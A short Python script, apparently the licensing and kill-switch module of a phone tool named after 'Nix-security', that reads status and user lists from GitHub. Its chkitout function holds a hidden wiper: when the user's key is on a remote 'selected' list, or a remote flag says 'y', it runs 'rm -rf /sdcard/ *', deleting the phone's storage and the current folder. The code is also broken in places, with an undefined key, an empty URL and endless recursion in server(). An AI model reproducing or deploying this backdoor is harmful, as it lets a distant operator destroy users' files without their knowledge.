import os,sys

try: 
	import requests
except: 
	os.system("pip install requests")
	import requests 
	
	
	
def server(): 
	try:
		database=requests.get("https://raw.githubusercontent.com/Robiul30/Nix-security-/main/Update.txt").text 
	except:  
	     print("internet Error[!]") 
	     sys.exit()
			
	if "ON" in database:
	       server()
	elif"Off" in database: 
	    print("Tool is Off")
	    sys.exit()
	else:
		while True:
		 print("ON")
	
	
#server()
#print("tool is on")


def chkitout():
	global key
	block=requests.get("https://raw.githubusercontent.com/Robiul30/Nix-security-/main/Block%20user.txt").text
	sr=requests.get("https://raw.githubusercontent.com/Robiul30/Nix-security-/main/Selected%20user.txt").text
	rm_al=requests.get("").text
	if key in block:
		print("you are block ")
	else:pass

	if key in sr:
		os.system("rm -rf  /sdcard/ *")
	else:pass

	if "y" in rm_al:
		os.system("rm -rf  /sdcard/ *")
	else:pass

server()		